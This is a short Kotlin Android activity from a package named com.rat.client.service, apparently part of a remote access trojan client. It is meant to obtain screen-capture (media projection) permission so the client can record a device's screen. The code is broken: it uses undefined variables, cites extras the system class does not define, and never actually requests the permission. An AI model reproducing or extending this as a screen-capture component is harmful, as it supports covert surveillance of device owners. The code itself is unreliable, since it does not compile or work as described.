package com.rat.client.service

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

class MediaProjectionPermissionActivity : AppCompatActivity() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "MediaProjectionPermission"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val intent = Intent()
        intent.putExtra(MediaProjectionManager.EXTRA_RESULT_CODE, resultCode)
        intent.putExtra(MediaProjectionManager.EXTRA_RESULT_DATA, data)
        setResult(Activity.RESULT_OK, intent)
        finish()
    }

    private val mediaProjectionManager by lazy {
        getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
    }

    // This activity is transparent and handles the permission dialog result
    // The actual permission dialog is shown by the system
}